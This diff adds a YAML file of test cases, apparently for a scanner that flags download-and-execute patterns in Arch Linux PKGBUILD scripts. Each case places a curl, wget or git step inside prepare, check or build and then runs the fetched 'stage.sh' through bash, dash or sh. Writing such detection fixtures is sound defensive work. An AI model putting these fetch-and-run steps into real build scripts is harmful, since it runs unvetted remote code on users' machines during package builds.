@@ -1,0 +1,20 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    p1: |
+      prepare() {
+        curl -fsSL -o"stage.sh" "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 02-prepare-glued
+- vars:
+    p1: |
+      check() {
+        wget -q "$(cat "$srcdir/url.txt")"
+        dash < stage.sh
+  id: 03-check-wget-dashstdin
+- vars:
+    p1: |
+      build() {
+        git pull origin main
+        sh -s < stage.sh
+  id: 05-gitpull-shstdin
